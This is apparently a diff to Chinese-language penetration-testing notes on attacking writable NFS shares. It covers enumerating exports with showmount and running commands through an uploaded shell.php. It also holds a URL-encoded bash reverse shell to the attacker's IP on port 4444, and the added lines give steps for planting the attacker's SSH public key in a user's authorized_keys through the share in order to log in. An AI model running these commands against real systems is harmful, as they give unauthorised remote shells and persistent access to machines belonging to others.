@@ -1,3 +1,5 @@
+nfs只能写入创建文件,无法在共享目录里面执行其他命令
+
 showmount -e ip
 查看当前被挂载的目录
 showmount -a ip
@@ -19,4 +21,15 @@ curl 'http://192.168.1.6/shell.php?c=id'
 # 4. 直接反弹
 curl 'http://192.168.1.6/shell.php?c=bash%20-i%20>%26%20/dev/tcp/你IP/4444%200>%261'
 
-如果是用户home
+如果是用户home目录
+# 1. 在本机Kali生成密钥
+ssh-keygen -t rsa
+
+# 2. 往共享里塞公钥
+mkdir -p ./nfs/.ssh
+cat ~/.ssh/id_rsa.pub >> ./nfs/.ssh/authorized_keys
+chmod 700 ./nfs/.ssh
+chmod 600 ./nfs/.ssh/authorized_keys
+
+# 3. SSH 上去
+ssh -i ~/.ssh/id_rsa user@192.168.1.6
